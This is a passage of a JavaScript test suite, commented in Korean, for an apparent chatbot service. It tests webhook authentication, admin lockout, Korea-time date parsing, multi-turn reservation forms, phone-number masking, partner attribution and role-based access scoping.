  assert.equal(kakao.authenticateKakao(h({ 'x-skill-token': 'wrong' }), body, { KAKAO_SKILL_TOKEN: 'right' }).reason, 'bad_token');
  assert.equal(kakao.authenticateKakao(h({ 'x-skill-token': 'right' }), body, { KAKAO_SKILL_TOKEN: 'right' }).ok, true);
});

test('카카오 웹훅 인증 — 시크릿이 있으면 서명이 맞아야만 통과한다', opts, async () => {
  const kakao = await importLib('kakao', ['webhookAuth']);
  const wa = await importLib('webhookAuth', []);
  const now = 1_700_000_000_000;
  const ts = String(Math.floor(now / 1000));
  const body = '{"userRequest":{"utterance":"안녕"}}';
  const env = { KAKAO_WEBHOOK_SECRET: 's3cr3t' };
  const sig = wa.signPayload('s3cr3t', ts, body);

  assert.equal(
    kakao.authenticateKakao(new Headers({ 'x-kakao-signature': sig, 'x-kakao-timestamp': ts }), body, env, now).ok,
    true,
  );
  assert.equal(
    kakao.authenticateKakao(new Headers({ 'x-kakao-signature': 'deadbeef', 'x-kakao-timestamp': ts }), body, env, now).reason,
    'mismatch',
  );
  assert.equal(kakao.authenticateKakao(new Headers(), body, env, now).reason, 'missing_signature');
});

/* ══════════ 관리자 인증 잠금 ══════════ */

test('토큰 대입이 반복되면 잠근다(성공하면 즉시 해제)', opts, async () => {
  const aa = await importLib('adminAuth', []);
  aa.resetLockouts();
  const now = 1_700_000_000_000;
  const threshold = aa.lockThreshold();

  let st;
  for (let i = 1; i <= threshold; i += 1) st = aa.recordAttempt('1.2.3.4', false, now + i);
  assert.equal(st.locked, true, `${threshold}회 실패하면 잠겨야 한다`);
  assert.ok(st.retryAfterSec > 0);

  // 잠긴 동안은 실패를 더 세지 않는다(잠금 무한 연장 방지)
  const during = aa.recordAttempt('1.2.3.4', false, now + 1000);
  assert.equal(during.failures, st.failures);

  // 다른 IP는 영향 없음
  assert.equal(aa.lockoutStatus('9.9.9.9', now).locked, false);

  // 잠금 시간이 지나면 다시 시도할 수 있고, 성공하면 카운트가 비워진다
  const after = now + aa.lockDurationMs() + 1000;
  assert.equal(aa.lockoutStatus('1.2.3.4', after).locked, false);
  assert.equal(aa.recordAttempt('1.2.3.4', true, after).failures, 0);
  aa.resetLockouts();
});

/* ══════════ 한국 시간 달력 (DS 21-x) ══════════ */

// 기준 시각은 **오프셋을 명시한 절대 시각**으로만 쓴다. `new Date(y, m, d, h)` 는 테스트 기계의
// 시간대로 조립된 뒤 같은 시간대로 읽히므로, 시간대 결함이 있어도 언제나 통과한다
// (종전 FIXED_NOW 가 그래서 UTC 서버의 하루 어긋남을 한 번도 잡지 못했다).
const KST_EARLY = new Date('2026-10-01T02:00:00+09:00'); // = 2026-09-30T17:00Z — UTC 달력으로는 9월 30일
const KST_LATE = new Date('2026-09-30T23:00:00+09:00'); // = 2026-09-30T14:00Z — 두 달력이 같은 날

test('한국 자정 직후의 「오늘」은 한국 날짜다 (DS 21-1)', opts, async () => {
  const k = await eng('kst');
  assert.equal(k.kstDate(KST_EARLY), '2026-10-01');
  assert.equal(k.kstMonth(KST_EARLY), '2026-10');
  assert.equal(k.kstStamp(KST_EARLY), '20261001');
  // 고치기 전 값 — UTC 달력으로 읽으면 하루 전이다(이 간극이 결함의 크기다).
  assert.equal(KST_EARLY.toISOString().slice(0, 10), '2026-09-30');
  assert.equal(k.kstDate(KST_LATE), '2026-09-30');
  assert.equal(k.kstStamp(KST_LATE), '20260930');
});

test('오프셋 계산이 시간대 데이터베이스(Intl)와 같은 날짜를 낸다 (DS 21-1)', opts, async () => {
  const k = await eng('kst');
  // 독립된 두 번째 구현(ICU 시간대 데이터)과 대조한다 — 서로 어긋나면 한쪽이 틀렸다.
  // 2026-03-08 은 미국 일광절약시간 시작일이다(한국은 영향 없음을 함께 확인).
  for (const iso of ['2026-01-01T00:30:00Z', '2026-03-08T17:30:00Z', '2026-06-15T15:00:00Z', '2026-09-30T17:00:00Z', '2026-12-31T23:59:00Z']) {
    const d = new Date(iso);
    assert.equal(k.kstDate(d), d.toLocaleDateString('sv-SE', { timeZone: 'Asia/Seoul' }), iso);
  }
});

/**
 * ★ 이 테스트만 **다른 시간대의 프로세스에서** 돌린다.
 *
 * 이 기계는 Asia/Seoul 이라, 날짜를 로컬 게터로 읽는 옛 코드도 여기서는 정답을 낸다 —
 * 즉 같은 프로세스 안에서는 어떤 입력을 주어도 결함을 재현할 수 없다(종전 테스트가 통과한 이유).
 * 배포 환경(Vercel Node = UTC)과 UTC 보다 뒤진 시간대를 자식 프로세스로 만들어 실제로 돌린다.
 */
// 자식 프로세스가 쓰는 컴파일 결과. 정산(settlement)까지 포함해야 기준월 기본값을 같이 돌릴 수 있다.
const TZ_LIBS = ['kst', 'slots', 'normalize', 'handoff', 'settlement', 'partners', 'storage', 'logger', 'monitoring'];

function runInTz(tz) {
  const dir = compileLibs(TZ_LIBS);
  const url = (n) => JSON.stringify(pathToFileURL(path.join(dir, `${n}.mjs`)).href);
  const code = [
    `import assert from 'node:assert/strict';`,
    `import { parseDateTime } from ${url('slots')};`,
    `import { kstDate, kstMonth, kstStamp } from ${url('kst')};`,
    `import { currentMonth } from ${url('settlement')};`,
    `assert.equal(Intl.DateTimeFormat().resolvedOptions().timeZone, ${JSON.stringify(tz)}, '자식 프로세스에 시간대가 걸리지 않았다');`,
    // 고객이 한국 시간 10월 1일 새벽 2시에 "오늘"이라고 말한다(= UTC 9월 30일 17시).
    `const early = new Date('2026-10-01T02:00:00+09:00');`,
    // 재현 전제: 이 시간대의 로컬 달력은 아직 9월 30일이다(고치기 전 코드가 읽던 값).
    `assert.equal(early.getDate(), 30, '재현 전제가 깨졌다 — 이 시간대에서는 로컬 달력이 9월 30일이어야 한다');`,
    `assert.equal(parseDateTime('오늘 오후 2시', early).value, '2026-10-01 14:00');`,
    `assert.equal(parseDateTime('내일', early).value, '2026-10-02 (시간 미정)');`,
    `assert.equal(parseDateTime('9월 30일 14시', early).value, '2027-09-30 14:00');`,
    `assert.equal(kstDate(early), '2026-10-01');`,
    `assert.equal(kstStamp(early), '20261001', '내려받는 파일 이름의 날짜');`,
    `assert.equal(kstMonth(early), '2026-10');`,
    `assert.equal(currentMonth(early), '2026-10', '정산 기준월 기본값');`,
  ].join('\n');
  execFileSync(process.execPath, ['--input-type=module', '-e', code], {
    env: { ...process.env, TZ: tz },
    stdio: 'pipe',
    encoding: 'utf8',
  });
}

test('서버 시간대가 UTC 여도 「오늘」은 한국 날짜다 (DS 21-1·21-2·21-3)', opts, () => {
  runInTz('UTC'); // 배포 환경(Vercel Node 런타임)
  runInTz('America/New_York'); // UTC 보다 더 뒤진 시간대 — 반대 방향으로도 어긋나지 않는지
});

test('달력 계산이 달·해를 넘긴다 (DS 21-1)', opts, async () => {
  const k = await eng('kst');
  assert.deepEqual(k.normalizeYmd(2026, 9, 31), { y: 2026, m: 10, d: 1 }, '없는 날짜는 다음 달로 넘긴다');
  assert.deepEqual(k.normalizeYmd(2026, 12, 32), { y: 2027, m: 1, d: 1 }, '해를 넘긴다');
  assert.deepEqual(k.normalizeYmd(2028, 2, 29), { y: 2028, m: 2, d: 29 }, '윤년 2월 29일은 그대로 둔다');
  assert.ok(k.compareYmd({ y: 2026, m: 9, d: 30 }, { y: 2026, m: 10, d: 1 }) < 0);
  assert.equal(k.compareYmd({ y: 2026, m: 9, d: 30 }, { y: 2026, m: 9, d: 30 }), 0);
  assert.ok(k.compareYmd({ y: 2027, m: 1, d: 1 }, { y: 2026, m: 12, d: 31 }) > 0);
});

/* ══════════ 멀티턴 슬롯 수집 — 순수 엔진 ══════════ */

// 2026-09-03(목) 10:00 KST — 상대 날짜 계산 기준 고정(절대 시각으로 적어 기계 시간대와 무관하게).
const FIXED_NOW = new Date('2026-09-03T10:00:00+09:00');

test('한국 자정~오전 9시에 말한 「오늘」이 어제로 접수되지 않는다 (DS 21-1)', opts, async () => {
  const { parseDateTime } = await eng('slots');
  // 고객은 10월 1일 새벽 2시에 "오늘"이라고 말했다. 서버(UTC)는 9월 30일이다.
  assert.equal(parseDateTime('오늘 오후 2시', KST_EARLY).value, '2026-10-01 14:00');
  assert.equal(parseDateTime('내일 오후 2시', KST_EARLY).value, '2026-10-02 14:00');
  assert.equal(parseDateTime('모레', KST_EARLY).value, '2026-10-03 (시간 미정)');
  // 연도 미기재 — 한국에서는 이미 지난 날짜(어제)이므로 내년으로 본다.
  assert.equal(parseDateTime('9월 30일 14시', KST_EARLY).value, '2027-09-30 14:00');
  // 경계를 넘긴 뒤에는 종전과 같은 값이다(두 달력이 같은 날인 시간대).
  assert.equal(parseDateTime('오늘 09:30', KST_LATE).value, '2026-09-30 09:30');
});

test('날짜·시간 표현을 파싱한다(상대·절대·오전오후)', opts, async () => {
  const { parseDateTime } = await eng('slots');
  assert.equal(parseDateTime('내일 오후 2시', FIXED_NOW).value, '2026-09-04 14:00');
  assert.equal(parseDateTime('오늘 09:30', FIXED_NOW).value, '2026-09-03 09:30');
  assert.equal(parseDateTime('2026-09-10 14:30', FIXED_NOW).value, '2026-09-10 14:30');
  assert.equal(parseDateTime('9월 10일 14시', FIXED_NOW).value, '2026-09-10 14:00');
  // 연도 미기재이고 이미 지난 날짜면 내년으로 본다(예약은 미래가 기본)
  assert.equal(parseDateTime('1월 5일', FIXED_NOW).value, '2027-01-05 (시간 미정)');
});

test('알아볼 수 없는 날짜 입력은 null(실패 경로)', opts, async () => {
  const { parseDateTime } = await eng('slots');
  assert.equal(parseDateTime('아무때나요', FIXED_NOW), null);
  assert.equal(parseDateTime('', FIXED_NOW), null);
});

test('선택지는 번호·동의어 양쪽으로 고를 수 있다', opts, async () => {
  const { matchChoice } = await eng('slots');
  const choices = ['웹 챗봇', '카카오톡', '전화 콜봇', '기타'];
  assert.equal(matchChoice(choices, '2'), '카카오톡');
  assert.equal(matchChoice(choices, '2번'), '카카오톡');
  assert.equal(matchChoice(choices, '카톡'), '카카오톡', '동의어 사전이 적용돼야 한다');
  assert.equal(matchChoice(choices, '9'), null, '범위 밖 번호는 거절');
  assert.equal(matchChoice(choices, '몰라요'), null);
});

test('잘못된 입력은 어느 항목이 왜 틀렸는지 + 예시를 돌려준다', opts, async () => {
  const { validateSlot, getForm, slotOf } = await eng('slots');
  const form = getForm('reservation');
  const contact = slotOf(form, 'contact');
  const bad = validateSlot(contact, '그냥 아무거나', FIXED_NOW);
  assert.equal(bad.ok, false);
  assert.match(bad.message, /연락처/);
  assert.match(bad.message, /010-1234-5678/, '입력 예시를 함께 줘야 한다');
  const good = validateSlot(contact, '연락처는 010-1234-5678 입니다', FIXED_NOW);
  assert.equal(good.ok, true);
  assert.equal(good.value, '010-1234-5678');
});

test('필수 항목은 건너뛸 수 없고, 선택 항목은 건너뛴다', opts, async () => {
  const slots = await eng('slots');
  const reservation = slots.getForm('reservation');
  const started = slots.startForm(reservation);
  const skipRequired = slots.applyInput(reservation, started.state, '건너뛰기', FIXED_NOW);
  assert.equal(skipRequired.kind, 'invalid');
  assert.match(skipRequired.message, /꼭 필요/);

  const trouble = slots.getForm('trouble');
  let st = slots.startForm(trouble).state;
  st = slots.applyInput(trouble, st, '위젯이 열리지 않아요', FIXED_NOW).state;
  st = slots.applyInput(trouble, st, '1', FIXED_NOW).state;
  const done = slots.applyInput(trouble, st, '건너뛰기', FIXED_NOW);
  assert.equal(done.kind, 'complete', '선택 항목(연락처)은 건너뛰면 바로 완료');
  assert.equal('contact' in done.values, false, '건너뛴 값은 저장하지 않는다');
  assert.equal(done.values.channel, '웹 챗봇');
});

test('"이전"은 직전 항목을 지우고 다시 묻는다', opts, async () => {
  const slots = await eng('slots');
  const form = slots.getForm('reservation');
  let st = slots.startForm(form).state;
  st = slots.applyInput(form, st, '홍길동', FIXED_NOW).state;
  assert.equal(st.values.name, '홍길동');
  const back = slots.applyInput(form, st, '이전', FIXED_NOW);
  assert.equal(back.kind, 'progress');
  assert.equal(back.slot.key, 'name');
  assert.equal('name' in back.state.values, false, '되돌린 항목의 값은 비워야 한다');
  // 첫 항목에서 "이전"은 되돌릴 곳이 없다고 안내한다(무반응 금지)
  const noBack = slots.applyInput(form, back.state, '이전', FIXED_NOW);
  assert.equal(noBack.kind, 'invalid');
  assert.match(noBack.message, /취소/);
});

/* ══════════ 멀티턴 슬롯 수집 — 대화 엔진 통합 ══════════ */

async function freshEngine() {
  delete process.env.CHAT_SLOT_FORMS;
  delete process.env.CHAT_LLM_LIVE;
  process.env.ADMIN_PERSIST = 'false';
  const chat = await eng('chat');
  const session = await eng('session');
  const esc = await eng('escalation');
  session.resetSessions();
  return { chat, session, esc };
}

test('예약 접수: 안내 → 3단계 수집 → 티켓 접수(정상 경로)', opts, async () => {
  const { chat, esc } = await freshEngine();
  const sid = 'rt-form-ok';

  const start = chat.replyTo('예약하고 싶어요', sid);
  assert.equal(start.form.id, 'reservation');
  assert.equal(start.form.step, 1);
  assert.equal(start.form.total, 3);
  assert.match(start.reply, /성함/);

  const s2 = chat.replyTo('홍길동', sid);
  assert.equal(s2.form.step, 2);
  assert.match(s2.reply, /날짜/);

  const s3 = chat.replyTo('내일 오후 2시', sid);
  assert.equal(s3.form.step, 3);
  assert.match(s3.reply, /연락처|전화번호/);

  const done = chat.replyTo('010-1234-5678', sid);
  assert.equal(done.form, undefined, '완료 턴에는 진행 표시가 없다');
  assert.ok(done.ticketId, '접수 티켓이 생겨야 한다');
  assert.match(done.reply, /접수번호/);
  assert.equal(done.reply.includes('010-1234-5678'), false, '원문 연락처를 화면에 그대로 노출하지 않는다');
  assert.match(done.reply, /010-\*\*\*\*-5678/, '마스킹된 형태로 확인시켜 준다');

  const ticket = esc.listTickets().find((t) => t.id === done.ticketId);
  assert.equal(ticket.reasonCode, 'customer_request');
  assert.match(ticket.summary, /예약자 성함: 홍길동/);
  assert.match(ticket.summary, /희망 일시/);
  assert.equal(ticket.summary.includes('010-1234-5678'), false, '이관 요약에도 원문 연락처가 남으면 안 된다');
});

test('같은 항목을 3번 못 알아들으면 상담원으로 넘긴다(실패 경로)', opts, async () => {
  const { chat, esc } = await freshEngine();
  const sid = 'rt-form-retry';
  chat.replyTo('예약하고 싶어요', sid);
  chat.replyTo('홍길동', sid);

  const r1 = chat.replyTo('아무때나요', sid);
  assert.match(r1.reply, /알아보지 못했어요/, '무엇이 왜 틀렸는지 알려야 한다');
  assert.equal(r1.form.step, 2, '같은 항목을 다시 묻는다');
  const r2 = chat.replyTo('그냥 편한 시간', sid);
  assert.equal(r2.form.step, 2);
  const r3 = chat.replyTo('알아서 해주세요', sid);
  assert.equal(r3.escalate, true);
  assert.ok(r3.ticketId);
  assert.equal(r3.handoffReason, 'max_retry');
  const ticket = esc.listTickets().find((t) => t.id === r3.ticketId);
  assert.equal(ticket.reasonCode, 'max_retry');
  assert.match(ticket.summary, /미수집 정보/, '무엇을 못 받았는지 상담원에게 알려야 한다');
});

test('"취소"로 수집을 중단하면 다음 질문은 정상 처리된다', opts, async () => {
  const { chat } = await freshEngine();
  const sid = 'rt-form-cancel';
  chat.replyTo('예약하고 싶어요', sid);
  const cancelled = chat.replyTo('취소', sid);
  assert.equal(cancelled.form, undefined);
  assert.match(cancelled.reply, /중단/);
  assert.equal(cancelled.ticketId, undefined, '취소는 접수를 만들지 않는다');

  const after = chat.replyTo('영업시간 알려주세요', sid);
  assert.equal(after.intent, 'hours', '취소 후 일반 대화로 즉시 복귀한다');
});

test('수집 중 상담원을 요청하면 즉시 이관한다', opts, async () => {
  const { chat } = await freshEngine();
  const sid = 'rt-form-agent';
  chat.replyTo('예약하고 싶어요', sid);
  const r = chat.replyTo('상담원 연결해 주세요', sid);
  assert.equal(r.escalate, true);
  assert.ok(r.ticketId);
  assert.equal(r.form, undefined);

  // 반대로 '연결이 안 돼요' 같은 증상 설명은 이관으로 새면 안 된다
  const sid2 = 'rt-form-agent-2';
  chat.replyTo('오류가 났어요', sid2);
  const symptom = chat.replyTo('연결이 안 돼요', sid2);
  assert.equal(symptom.form.id, 'trouble');
  assert.equal(symptom.form.step, 2, '증상으로 받아들이고 다음 항목으로 진행해야 한다');
});

test('게이트를 끄면(CHAT_SLOT_FORMS=false) 기존 룰 응답만 나간다', opts, async () => {
  const { chat } = await freshEngine();
  process.env.CHAT_SLOT_FORMS = 'false';
  try {
    const r = chat.replyTo('예약하고 싶어요', 'rt-form-off');
    assert.equal(r.form, undefined);
    assert.equal(r.intent, 'reservation');
    assert.equal(r.source, 'rule');
  } finally {
    delete process.env.CHAT_SLOT_FORMS;
  }
});

test('모든 폼 정의에 라벨·질문·예시가 채워져 있다(빈 화면 방지)', opts, async () => {
  const { FORMS } = await eng('slots');
  assert.ok(FORMS.length > 0);
  for (const form of FORMS) {
    assert.ok(form.title && form.slots.length > 0, `${form.id}: 제목·슬롯 필요`);
    for (const slot of form.slots) {
      assert.ok(slot.label && slot.prompt && slot.hint, `${form.id}.${slot.key}: 라벨·질문·예시 필요`);
      if (slot.kind === 'choice') assert.ok(slot.choices?.length >= 2, `${form.id}.${slot.key}: 선택지 필요`);
    }
  }
});

test('마스킹이 날짜를 계좌번호로 오인하지 않는다(회귀)', opts, async () => {
  const { maskPii } = await eng('handoff');
  const r = maskPii('예약 일시 2026-09-04 14:00, 연락처 010-1234-5678');
  assert.match(r.text, /2026-09-04 14:00/, '날짜는 원문 그대로 남아야 상담원이 일정을 안다');
  assert.match(r.text, /010-\*\*\*\*-5678/, '연락처는 마스킹돼야 한다');
  assert.equal(r.hits.includes('phone'), true);
  assert.equal(r.hits.includes('account'), false, '날짜를 계좌로 집계하면 통계가 틀어진다');
  // 진짜 계좌번호는 여전히 마스킹한다
  assert.match(maskPii('계좌 110-234-567890').text, /\*\*\*-\*\*\*\*-\*\*\*\*/);
});

/* ══════════ 파트너(채널) · 매출 귀속 ══════════ */

async function partnersLib() {
  process.env.ADMIN_PERSIST = 'false'; // 테스트는 디스크에 쓰지 않는다
  const lib = await importLib('partners', ['storage', 'logger', 'monitoring']);
  lib.resetPartners();
  return lib;
}

test('고객사는 파트너 없이도 등록된다(직접 계약이 기본)', opts, async () => {
  const P = await partnersLib();
  const r = P.upsertAccount({ name: 'OO의원' });
  assert.equal(r.ok, true);
  assert.equal(r.account.partnerId, null, 'partnerId는 nullable — 없으면 직접 계약');
  assert.equal(r.account.source, 'unknown');
  assert.equal(r.account.attribution.length, 1, '최초 등록도 귀속 근거로 남는다');
  assert.equal(r.account.attribution[0].note, '최초 등록');
});

test('귀속을 바꾸면 이전 값·사유가 이력으로 남는다(정산 근거)', opts, async () => {
  const P = await partnersLib();
  const p = P.upsertPartner({ name: '제이투모로우원', feeRateBp: 1500 });
  assert.equal(p.ok, true);
  const created = P.upsertAccount({ name: 'AA치과' });

  const moved = P.upsertAccount({
    id: created.account.id,
    name: 'AA치과',
    partnerId: p.partner.id,
    source: 'partner',
    attributionNote: '파트너 소개로 최초 미팅(2026-08-20)',
    authed: true,
  });
  assert.equal(moved.ok, true);
  assert.equal(moved.account.partnerId, p.partner.id);
  assert.equal(moved.account.attribution.length, 2);
  const last = moved.account.attribution[1];
  assert.equal(last.fromPartnerId, null);
  assert.equal(last.toPartnerId, p.partner.id);
  assert.match(last.note, /파트너 소개/);
  assert.equal(last.authed, true, '인증 여부가 남아야 분쟁 시 근거가 된다');

  // 귀속이 바뀌지 않는 단순 수정은 이력을 늘리지 않는다(노이즈 방지)
  const renamed = P.upsertAccount({ id: created.account.id, name: 'AA치과의원', partnerId: p.partner.id, source: 'partner' });
  assert.equal(renamed.account.attribution.length, 2);
});

test('잘못된 입력은 거절하고 이유를 돌려준다(실패 경로)', opts, async () => {
  const P = await partnersLib();
  assert.equal(P.upsertAccount({ name: '  ' }).error, '고객사명을 입력해 주세요.');
  assert.match(P.upsertAccount({ name: 'BB', partnerId: 'PTR-9999' }).error, /존재하지 않는 파트너/);
  assert.match(P.upsertAccount({ name: 'BB', source: 'partner' }).error, /파트너를 지정/);
  // 형식 토큰(YYYY-MM-DD)·내부 단위(bp)는 거절 문장에 적지 않는다(DS 29-3).
  assert.match(P.upsertAccount({ name: 'BB', contractedAt: '2026-02-31' }).error, /2026-09-01 처럼 연-월-일/);
  assert.match(P.upsertAccount({ name: 'BB', status: 'contracted' }).error, /계약일이 필요/);
  assert.match(P.upsertPartner({ name: 'X', feeRateBp: 99999 }).error, /0~100% 사이의 숫자/);
  assert.match(P.upsertPartner({ name: '' }).error, /파트너명/);
});

test('연결된 고객사가 있는 파트너는 삭제되지 않는다(되돌릴 수 없는 동작 보호)', opts, async () => {
  const P = await partnersLib();
  const p = P.upsertPartner({ name: '테스트파트너' });
  P.upsertAccount({ name: 'CC사', partnerId: p.partner.id, source: 'partner' });
  const blocked = P.deletePartner(p.partner.id);
  assert.equal(blocked.ok, false);
  assert.match(blocked.error, /연결된 고객사가 1곳/);

  // 귀속을 직접 계약으로 옮기면 삭제할 수 있다
  const acc = P.queryAccounts({ partnerId: p.partner.id })[0];
  P.upsertAccount({ id: acc.id, name: acc.name, partnerId: '', source: 'direct', attributionNote: '직접 계약으로 전환' });
  assert.equal(P.deletePartner(p.partner.id).ok, true);
});

test('조회는 queryAccounts 한 곳을 지난다(2계층 확장 지점)', opts, async () => {
  const P = await partnersLib();
  const p1 = P.upsertPartner({ name: '파트너1' }).partner;
  const p2 = P.upsertPartner({ name: '파트너2' }).partner;
  P.upsertAccount({ name: '가나사', partnerId: p1.id, source: 'partner', status: 'contracted', contractedAt: '2026-09-01' });
  P.upsertAccount({ name: '다라사', partnerId: p2.id, source: 'partner' });
  P.upsertAccount({ name: '마바사', source: 'direct' });

  assert.equal(P.queryAccounts().length, 3);
  assert.equal(P.queryAccounts({ partnerId: p1.id }).length, 1);
  assert.equal(P.queryAccounts({ partnerId: 'direct' }).length, 1, '직접 계약만 걸러낼 수 있어야 한다');
  assert.equal(P.queryAccounts({ status: 'contracted' })[0].name, '가나사');
  assert.equal(P.queryAccounts({ q: '다라' }).length, 1);
  assert.equal(P.queryAccounts({ q: '없는회사' }).length, 0);
});

test('수수료율은 설정값이며, 미설정이면 임의 수치를 만들지 않는다', opts, async () => {
  const P = await partnersLib();
  delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
  const noFee = P.upsertPartner({ name: '수수료미정' }).partner;
  assert.equal(noFee.feeRateBp, null);
  assert.equal(P.effectiveFeeRateBp(noFee), null, '기본값이 없으면 null이어야 한다(임의 KPI 금지)');
  process.env.PARTNER_DEFAULT_FEE_RATE_BP = '1000';
  try {
    assert.equal(P.effectiveFeeRateBp(noFee), 1000, '설정값이 있으면 그것을 쓴다');
    assert.equal(P.effectiveFeeRateBp({ feeRateBp: 2000 }), 2000, '파트너 개별 설정이 우선');
  } finally {
    delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
  }
});

test('집계는 건수만 센다(금액·성과 수치를 지어내지 않는다)', opts, async () => {
  const P = await partnersLib();
  const p = P.upsertPartner({ name: '집계파트너' }).partner;
  P.upsertAccount({ name: 'A', partnerId: p.id, source: 'partner', status: 'contracted', contractedAt: '2026-09-01' });
  P.upsertAccount({ name: 'B', partnerId: p.id, source: 'partner' });
  P.upsertAccount({ name: 'C', source: 'direct' });

  const rows = P.rollupByPartner();
  const row = rows.find((r) => r.partnerId === p.id);
  assert.equal(row.total, 2);
  assert.equal(row.contracted, 1);
  assert.equal(row.prospect, 1);
  const direct = rows.find((r) => r.partnerId === null);
  assert.equal(direct.total, 1);
  assert.equal(Object.keys(row).some((k) => /revenue|amount|매출/.test(k)), false, '금액 필드는 아직 없다');
});

test('스냅샷 복원: 손상 항목은 건너뛰고 귀속은 지우지 않는다', opts, async () => {
  const P = await partnersLib();
  const bad = P.importPartners({ partners: 'nope' });
  assert.equal(bad.ok, false, '형식이 어긋나면 실패를 알린다');

  const r = P.importPartners({
    version: 1,
    partners: [
      { id: 'PTR-0003', name: '복원파트너', status: 'active', feeRateBp: 1200 },
      { id: '', name: '이름없는id' },
    ],
    accounts: [
      { id: 'ACC-0007', name: '정상사', partnerId: 'PTR-0003', source: 'partner', status: 'contracted', contractedAt: '2026-01-02', attribution: [] },
      { id: 'ACC-0008', name: '고아사', partnerId: 'PTR-9999', source: 'partner' },
      { id: 'ACC-0009' },
    ],
  });
  assert.equal(r.ok, true);
  assert.equal(r.partners, 1, '무효 파트너는 건너뛴다');
  assert.equal(r.accounts, 2, '무효 고객사는 건너뛴다');
  // 가리키는 파트너가 저장분에 없어도 **귀속은 그대로 둔다** (DS 53-3) — 아래 DS 53-3 테스트가
  // 왜 그래야 하는지를 센다(지우면 정산 리포트가 「직접 계약」이라는 거짓을 완전한 수로 말한다).
  assert.equal(P.getAccount('ACC-0008').partnerId, 'PTR-9999', '없는 파트너를 가리키면 귀속을 지운다');
  assert.equal(r.orphans, 1, '귀속 파트너를 찾을 수 없는 고객사 수를 말하지 않는다');
  // 복원 후 새로 만든 id가 기존 id와 충돌하지 않는다
  const next = P.upsertAccount({ name: '신규사' });
  assert.equal(next.account.id, 'ACC-0010');
  assert.equal(P.upsertPartner({ name: '신규파트너' }).partner.id, 'PTR-0004');
});

/* ══════════ RBAC — 파트너 담당자 권한 ══════════ */

const ADMIN_TOK = 'admin-token-0123456789';
const PTR_TOK = 'partner-token-abcdefghij';

async function rbacLib(env = {}) {
  const lib = await importLib('rbac', ['webhookAuth']);
  delete process.env.ADMIN_TOKEN;
  delete process.env.PARTNER_TOKENS;
  delete process.env.PARTNER_PORTAL_ENABLED;
  Object.assign(process.env, env);
  return lib;
}

function clearRbacEnv() {
  delete process.env.ADMIN_TOKEN;
  delete process.env.PARTNER_TOKENS;
  delete process.env.PARTNER_PORTAL_ENABLED;
}

test('관리자 토큰이 일치하면 admin 주체가 된다', opts, async () => {
  const R = await rbacLib({ ADMIN_TOKEN: ADMIN_TOK });
  const p = R.resolvePrincipal(ADMIN_TOK, { adminAuthRequired: true });
  assert.ok(p, '관리자 토큰은 통과해야 한다');
  assert.equal(p.role, 'admin');
  assert.equal(p.partnerId, null);
  assert.equal(p.authed, true);
  clearRbacEnv();
});

test('틀린 토큰은 주체를 얻지 못한다(실패 경로)', opts, async () => {
  const R = await rbacLib({ ADMIN_TOKEN: ADMIN_TOK });
  assert.equal(R.resolvePrincipal('wrong-token-value-xxxx', { adminAuthRequired: true }), null);
  assert.equal(R.resolvePrincipal('', { adminAuthRequired: true }), null);
  assert.equal(R.resolvePrincipal(null, { adminAuthRequired: true }), null);
  clearRbacEnv();
});

test('파트너 포털이 꺼져 있으면 파트너 토큰은 통하지 않는다(기본 OFF)', opts, async () => {
  const R = await rbacLib({ ADMIN_TOKEN: ADMIN_TOK, PARTNER_TOKENS: `PTR-0001:${PTR_TOK}` });
  assert.equal(R.partnerPortalEnabled(), false, '기본값은 비활성이어야 한다');
  assert.equal(R.resolvePrincipal(PTR_TOK, { adminAuthRequired: true }), null, '게이트 OFF면 거절');
  clearRbacEnv();
});

test('포털이 켜지면 파트너 토큰이 자기 파트너 범위의 주체가 된다', opts, async () => {
  const R = await rbacLib({
    ADMIN_TOKEN: ADMIN_TOK,
    PARTNER_TOKENS: `PTR-0001:${PTR_TOK},PTR-0002:another-token-1234567`,
    PARTNER_PORTAL_ENABLED: 'true',
  });
  const p = R.resolvePrincipal(PTR_TOK, { adminAuthRequired: true });
  assert.ok(p);
  assert.equal(p.role, 'partner_admin');
  assert.equal(p.partnerId, 'PTR-0001');
  assert.equal(R.canWrite(p), false, '파트너 담당자는 읽기 전용이어야 한다');
  assert.equal(R.canWrite({ role: 'admin', partnerId: null, authed: true }), true);
  clearRbacEnv();
});

test('짧은 파트너 토큰·형식 오류 항목은 버려진다', opts, async () => {
  const R = await rbacLib({ PARTNER_PORTAL_ENABLED: 'true' });
  const creds = R.parsePartnerTokens('PTR-0001:short,PTR-0002:proper-token-abcdefgh,badline,PTR-0002:dup-token-abcdefghij');
  assert.equal(creds.length, 1, '유효 항목만 남아야 한다');
  assert.equal(creds[0].partnerId, 'PTR-0002');
  assert.equal(creds[0].token, 'proper-token-abcdefgh');
  clearRbacEnv();
});

test('ADMIN_TOKEN 미설정 + 게이트 ON 이면 전면 차단된다', opts, async () => {
  const R = await rbacLib({ PARTNER_PORTAL_ENABLED: 'true', PARTNER_TOKENS: `PTR-0001:${PTR_TOK}` });
  assert.equal(R.resolvePrincipal(PTR_TOK, { adminAuthRequired: true }), null);
  // 게이트 OFF면 기존 개방 동작(관리자·미인증)
  const open = R.resolvePrincipal(null, { adminAuthRequired: false });
  assert.equal(open.role, 'admin');
  assert.equal(open.authed, false, '개방 모드는 인증된 것으로 기록하지 않는다');
  clearRbacEnv();
});

test('파트너 담당자의 조회 범위는 요청값과 무관하게 자기 파트너로 고정된다', opts, async () => {
  const R = await rbacLib();
  const partner = { role: 'partner_admin', partnerId: 'PTR-0001', authed: true };
  // 남의 파트너를 조회하려 해도 자기 것으로 덮어써진다
  assert.equal(R.scopeAccountFilter(partner, { partnerId: 'PTR-0002' }).partnerId, 'PTR-0001');
  assert.equal(R.scopeAccountFilter(partner, {}).partnerId, 'PTR-0001');
  // 상태 등 다른 필터는 보존된다
  assert.equal(R.scopeAccountFilter(partner, { status: 'contracted' }).status, 'contracted');
  // 관리자는 요청한 필터 그대로
  const admin = { role: 'admin', partnerId: null, authed: true };
  assert.equal(R.scopeAccountFilter(admin, { partnerId: 'PTR-0002' }).partnerId, 'PTR-0002');
  // 파트너 목록도 자기 것만
  const list = [{ id: 'PTR-0001' }, { id: 'PTR-0002' }];
  assert.deepEqual(R.scopePartners(partner, list).map((p) => p.id), ['PTR-0001']);
  assert.equal(R.scopePartners(admin, list).length, 2);
  clearRbacEnv();
});

/* ══════════ 정산 리포트 ══════════ */

async function settlementLib() {
  process.env.ADMIN_PERSIST = 'false';
  delete process.env.PARTNER_DEFAULT_FEE_RATE_BP;
